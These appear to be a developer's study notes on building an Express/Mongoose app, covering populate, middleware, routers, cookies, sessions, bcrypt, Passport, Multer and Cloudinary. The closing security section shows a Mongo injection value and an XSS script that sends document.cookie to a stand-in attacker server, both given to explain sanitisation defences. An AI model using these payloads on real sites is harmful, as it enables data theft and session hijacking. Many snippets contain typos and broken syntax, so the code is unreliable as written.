const addressSchema = new mongoose.Schema({
    state: String,
    country: String,
    town: String,
    street: Number
});

const userSchema = new monggose.Schema(
{
    name: String,
    phone: Number,
    addresses: [ { type: mongoose.Schema.Types.ObjectId, ref: 'Address' } ]  -> ref: is which model this will refer to
});

const User = mongoose.model('User', userSchema);
const Address = mongoose.model('Address', addressSchema);

const u = new User({
    name: 'User a',
    phone: 355353553
});

const add = new Address({
    state: 'wefwe',
    country: 'fwef',
    town: 'fweqfwe',
    street: 5
});
await add.save();
u.addresses.push(add);
await u.save();

const result = await u.save(); ->though if we print result it will show address actually present, but if we see the result from mongo shell then we will find that actually the reference of address are present and not the addresses itself.

Now if we try to find some user :
const u = await User.findOne({name: 'User a'});
console.log(u);

result :

{
    _id: ObjectId("3b396898n9tn3683989n"),
    name: 'User a',
    phone: 3689034860346,
    addresses: [ 9385n9839n689389368m47m ]
}

here the addreses contains the ids , so if we want mongooses to fill the addresses with the document to which those id points, we can do that using populate() method , and passing the field that we want to be populated.
const u = await User.findOne({name: 'User a'}).populate('addresses');
console.log(u);

* we can also provide the specific field property to be populated. .populate('addresses', 'state')


result:

{
    _id: ObjectId("3b396898n9tn3683989n"),
    name: 'User a',
    phone: 3689034860346,
    addresses: [ 
        {
            _id: 3n68036n9036963m,
            state: 'er',
            country: 'ergerh',
            town: 'regerheh',
            street: 45
        }
     ]
}

* to populate multiple fields on the same level, then we can chain on populate() like:
    await User.findOne({name: 'User a'}).populate('addresses').populate('some field');

* to populate nested filds
    e.g,
    reviews: {
        'review':'hi',
        'author': objectId
    }
    campground :{
        name: 'sd',
        reviews: [ObjectId]
    }


now ehen we get a campground we have to populate review and inside review we have to populate author
await Campground.findById(id).populate({
        path: 'reviews',
        populate: {
            path: 'author'
        }
    }).populate('author');


2) other way to structure is storing reference of parent document in child element ( when the data is large (i.e more relationships) )




------------- mongoose middleware

Mongoose has 4 types of middleware: 
1. document middleware
2. model middleware
3. aggregate middleware
4. and query middleware

eg. middleware when any resource is deleted

like when findByIdAndDelete is executed then middleware 
findOneAndDelete is called.

and this middleware is defined on the schema

e.g,
when a campground is delete , delete all the reviews associated with it

---------------

const campgroundSchema = new Schema({
    title:String,
    price: Number,
    location: String,
    description: String,
    image: String,
    reviews: [
        {
            type: Schema.Types.ObjectId,
            ref: 'Review'
        }
    ]
});

campgroundSchema.post('findOneAndDelete', async function (doc) {
    if(doc) {
        console.log(doc);
        await Review.deleteMany({_id: {$in: doc.reviews}});
    }
})

--------------- express.Routers --------------------

- used to separate routes in different files
- A Router instance is a complete middleware and routing system; for this reason, it is often referred to as a “mini-app”.

bird.js    

const express = require('express');
const router = express.Router();

router.get('/', async(req, res) => {
    res.send('home');
})

router.get('/:id', async (req, res) => {
    res.send("edit");
})

module.exports = router

---- index.js file

const express = require('express');
const app = expresse();

const bird = require('./bird.js);



app.use('/bird', bird);
note: after /bird   the route specified in bird will be appended.

so the routes eventually will become:
/bird/
/bird/:id

note: add { mergeParams: true} while calling .Router() 
to access the params of the route mentioned in the main app

const router = express.Router({mergeParams: true})


------------------- Cookies ------------------
- it is small piece of data stored on the user's browser when browsing a particular website


it is basically used to keep track of user action like when did the a person first visited the website, how many times it was visited, it also is used to validate if it same user that loggedin before.

and this cookie is sent by the user's browser everytime a request is made. So that user don't have to proof is identity again and again, and this is how stateful http is achieved. 

########## Sending cookies

e.g,

const express = require('express');
const app = express();


app.get('/setname', (req, res) ={
    res.cookie('name', 'Ritik Raj');
    res.send('hello');
})

// when we go to /setname, a cookie will be sent with name 'name' and have value 'Ritik Raj' in it.

and it will remain there , and whenever we make request to this server the browser will also send this cookie with the request.

############ Parsing cookies

-- npm i cookie-parser

const cookieParser = require('cookie-parser');
app.use(cookieParser());

now we can see cookies using req.cookie()

app.get('/', (req, res) => {
    console.log(req.cookies);
    res.send("hello");
})


############ Signed Cookie

it is to verify the original data we sent to the browser is same which is sent to us on subsequent requests.

app.use(cookieParser("secretSignature"));

app.get('/getsignedcookie', (req, res) => {
    res.cookie('fruit', 'apple', {signed: true});
    res.send("signed your cookie");
})


--- signed cookies are not available in req.cookies;
--- available in req.signedCookies.

############# How signing of cookies works

signedcookie looksline:
%12vsdAapple.negieg4234g3ggg3g3g

after the . -> is the signature

HMAC -> hash-based message uthentication code

- signing

HMAC (unique code)is generated using SHA256 Algorithm, when a cookie i.e, the value is signed using a secret key.

- unsigning
Now when we try to access the cookie, then again the cookie is signed with the same secret key and compare it with the signature(i.e after . )  if it matches, it means the cookie was not tempered with.

Cons of using cookie:

- size limit
- not secure


-------------- Sessions -----------------

- its not very practical( or secure) to store a lot of data client-side using cookies. This is where session comes in!

Sessions are a server-side data store that we use to make HTTP stateful. Instead of storing data using cookies, we store the data on the server side and then send the browser a cookie that can be used to retrive the data.


- the default store for this memory is MemoryStore, and is not designed for production environment, but nly for debugging and developing.

when we make a request for first time, we are given a session id , and then on each subsequent reqest the browser sends back that session id, and server sends back the data that corresponds to this session id.

This session id, has all the required data.

* npm i express-session
- no need to install cookie parser.

const express = require('express');
const app =express();

// documentation: https://www.npmjs.com/package/express-session

const session = require('express-session');

app.use(session({secret: 'secretkey'}));

app.get('/viewcount', (req, res) => {
    if(req.session.count) {
        req.session.count +=1;
    } else {
        req.session.count = 1;
    }
    res.send(`You have viewed this page: ${req.session.count} times);
})


########### flash

special area of session used for storing messages. 
Messages are written to the flash and cleared after displaying to the user.

* npm i connect-flash

const session = require('express-session');
const flash = require('flash');

app.use(session({secret: 'secretkey'}));
app.use(flash());


e.g we can flash message when we create an accout

app.get('/', (req, res) => {
    const accounts = ' fetch accounts from db '

    res.render('index', {accounts, messages: req.flash('success')});

})

app.post('/adduser', (req, res) => {
    const newuser = ' create and save user to db'

    req.flash('success', 'Successfully created a new user');
    res.redirect('/');
})

- the flash message disappear when we refresh or navigate to other page.


it can be repetitive to add 
messages: req.flash('success')

on every routes 'res'

so we can use middleware so that it's automatically send with res object.

######### res.locals

An object that contains response local variables scoped to the request, and therefore available only to the view(s) rendered during the request/response(cycle) otherwise this property is identical to app.locals .

app.use((req, res, next) => {
    res.locals.messages = req.flash('success');
    next();
})


--------------------- Authentication and Authorization ---------------------

### Authentication
- process of verifying who a particular user is.
- typically using username/password

Authorization
- verifying what a specific user has access to.
- generally, we authorize after a user been authenticated.
i.e, "Now that we know who you are, here is what you are allowed to do and NOT allowed to do"


#### how to store password

- we don't directly store the password instead we first hash them by passing them through a hashing function.

- Hashing function
are functions that map input of some arbitrary size to fixed-size output values.
- so hashing function should give the same output for a given input


#### Cryptographic hash function

1. one-way function which is infeasible to revert
i.e, we should not be able to convert the hash back to the password

2. small change in input yields large change in the output

3. deterministic i.e, same input yields same output

4. unlikely to find 2 outputs with same value

5. Password Hash Functions are deliberately SLOW.



###### Password salts
 
a salt is a random value added to the password before we hash it.


---------- Bcrypt (hashing function)

- bcryptjs -> written entirely in js , and can run both on client and server side

- bcrypt -> built on top of c++, made for server side (this is what we will use)

- npm i bcrypt

const bcrypt = require('bcrypt');

"""

"salt round" they actually mean the cost factor. The cost factor controls how much time is needed to calculate a single BCrypt hash. The higher the cost factor, the more hashing rounds are done. Increasing the cost factor by 1 doubles the necessary time.

"""

// 12 -> is the (salt round) , it basically determines how long it takes to generate a hash.
and the higher it is, the more hashing rounds are done

- recommended is 12


//salt -> like $2sadhbnf434i3bbn.Gtniwfe4sd

const hashPassword = async (pw) => {
    const salt = await bcrypt.genSalt(12);
    const hash = await bcrypt.hash(pw, salt);
    console.log(salt);
    console.log(hash);
}
hashPassword('monkey');

"""

sample output:

$2b$10wfnjwf343nt4n34i.Jh0o
$2b$10wfnjwf343nt4n34i.Jh0osmadqiuwinn2345sdndsns

- salt is a part of the hash

so we dont have to store the salt. when a user enters password then this salt( beginning part of hash) is extracted from hash and it is added with the password and then hash is calculated, if it matches with the hash stored then the user gets authenticated.

"""

const login = async (pw, hashedPwd) => {
    const result = await bcrypt.compare(pwd, hashedPwd);
    if(result) {
        console..log("Logged in");
    } else {
        console.log("Incorrect password");
    }
}


Note: we don't need to generate salt and then hash the password, both can be done at the same time

=> const hash = await bcrypt.hash(pwd, 12);


######## require login middleware

const requireLogin  = (req, res, next) => {
    if( !req.session.user_id) {
        res.redirect('/login);
    }
    else {
        next();
    }
}



-------------- Passport --------------

- npm install passport
- npm install passport-local
- npm install passport-local-mongoose

- in models

const passportLocalMongoose = require('passport-local-mongoose)

userschema.plugin(passportLocalMongoose);

it will add , username, hash, salt field to store the username, the hashed password and the salt value


- in app.js

const passport = require('passport);
const LocalStrategy = require('passport-local);

// this below order of middleware should be maintained

const sessionConfig = {
    name:'something',
    secret: 'efergergergerg',
    resave: false,
    saveUninitialized: true,
    cookie: {
        httpOnly: true,
        secure: true,
        expires: Date.now() + 1000 * 60 * 60 * 24 * 7,
        maxAge: 1000 * 60 * 60 * 24 * 7
    }
}

httpOnly: true -> cookies set using session will only be accessible through http
                    and not by any javascript

secure: true -> cookie will work only on  https

name: 'wedfw' -> default name is connect.sid

-----------------------------------------------

app.use(session(sessionConfig));

// to initialize passport
app.use(passport.initialize());

// to enable out application to use persistent login
app.use(passport.session)

passport.use(new LocalStrategy(User.authenticate()))

passport.searializeUser(User.serializeUser());
passport.deserializeUser(User.deseriatlizeUser());


// logging user

app.post('/login', passport.authenticate('local', { failureFlash: true, failureRedirect: '/login'}), (req, res)=> {
    req.flash('success', 'welcome back');
})


// req.isAuthenticated() -> this is added by passport


// logging out

router.get('/logout', (req, res, next) => {
    req.logout(function (err) {
        if (err) {
            return next(err);
        }
        req.flash('success', 'Goodbye!');
        res.redirect('/campgrounds');
    });
}); 

- req.user -> contains deserialized information from session


- passport exposes a login() function on req, that can be used to establish a login session

Note: passport.authenticate() invokes this req.login() automatically.

this function is primarily used when user signs up, during which req.login() can be invoked to autiomatically log in the newly registered user.


-------- Controllers

"controllers" — functions that separate out the route from 
                the code that actually processes requests.


-------- router.route() 
- to restructure our routes
- it provides way to difine different http verbs for a same route


----------- Sending Files using forms (Multer)

- we need to use attribute 'enctype'
enctype = 'multipart/form-data'

Now, on submitting form with this 'enctype' it won't parsed by
express.urlencoded() middleware 

instead

we need to use other middleware called 'Multer'

Multer - is a NodeJs middleware for handling multipart/form-data,
        which is primarily used for uploading files.

Note: Multer won't process any form that's not 'multipart'

- Multer adds a body object and file or files object to the request object.
  The body contains the value of the text fields of the form, the file or files object contains
  the files uploaded via the form

setting up multar :

const app = express();
const multar = require('multar');

const upload = multer({dest: 'uploads/'});


// for single file
 
app.post('/', upload.single('file'), (req, res) => {
    req.file will have 'file';
    'file' is basically value in name attribute in form
})

// for multiple files

in form input add 'multiple'

app.post('/', upload.array('file'), (req, res) => {
    req.file will have 'files';
})

--- Cloudinary -> service for storing images

npm i cloudinary multer-storage-cloudinary


// Sample code using cloudinary

const cloudinary = require('cloudinary').v2;

const { CloudinaryStorage } = require('multer-storage-cloudinary');

cloudinary.config({
    cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
    api_key: process.env.CLOUDINARY_API_KEY,
    api_secret: process.env.CLOUDINARY_SECRET_KEY
});


const storage = new CloudinaryStorage({
    cloudinary,
    folder: 'YelpCamp',
    allowedFormats: ['jpeg', 'png', 'jpg']
})

module.exports = {cloudinary, storage}


const upload = multer({storage});

app.post('/', upload.array('image'), (req, res) => {
    ...
})

bs-custom-file-input
- plugin which provide some feature to input 
like:

Works with Bootstrap 4
Works without dependencies and jQuery
Display file name
Display file names for multiple input
Reset your custom file input to its initial state
Handle form reset
Allow custom selectors for input, and form
Allow to drag and drop files
Allow you to change the default display with a child in the <label> element
Built in UMD to be used everywhere
Small, only 2kb and less if you gzip it

- npm install bs-custom-file-input



-------------------- Security issues 

------------ Mongo injection

= let's say there is an input which take username, and it find a certain user in database.
    db.users.find({username: req.body.username});

Now if in that input, user enter something malicious like
    {'$gt': ""} 
    result to:
    db.users.find({username: {'$gt': '' }});
    this will basically retrive all the user from database as the query meany
    find all user which is greater than empty

So to avoid above possible cases we should restrict user from entering any such characters.

Fo this we will use package called:
- npm i express-mongo-sanitize


it basically removes any query that has dollar sign or period, from params or body

const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());


--------------Cross-site scripting

it basically enables injecting client side scripts into web page.

one possible scenario would be , an attacker would write the malicious script
inside the input box and if our code reads it as html then the malicious code will execute

So, we have to take care of that.

eg.

<script>new Image().src="mybadserver/hacker?output="document.cookie;</script>
whe
n we set src on image , browser sends a request to that source, so in this case if
any attacker manages to inject the above script then he would get the cookie information delivered to the his website
which is in the src attribute of image.

we will us joi which  will escape any script or html , if user enter in input

- joi allows us to define extensions and we can use these extensions on out schema like .string().mycustomextension()

e.g.,

const extension = (joi) => {
    type: 'string',
    base: joi.string(),
    message: {
        'string.escapeHTML': '{{#label}} must not include HTML!'
    },
    rules: {
        escapeHTML: {
            calidate(value, helpers) {
                const clean = sanitizeHtml(value, {
                    allowedTags: [],
                    allowedAttributes: {},
                });
                if(clean !== value) return helpers.error('string.escapeHTML', { value })
                return clean;
            }
        }
    }
}

above extension can be applied on any thing which has string properties i.e, .string().customextension();

- sanitize-html package is used above to strip any html tags from values


const BaseJoi = require('joi);
const Joi = BaseJoi.extend(extension);

now we can use:
{
    title: Joi.string().required().escapeHTML()
}

============== Helmet

- secures the Express app by adding various HTTP headers
- it consists of about 11 middlewares


 */
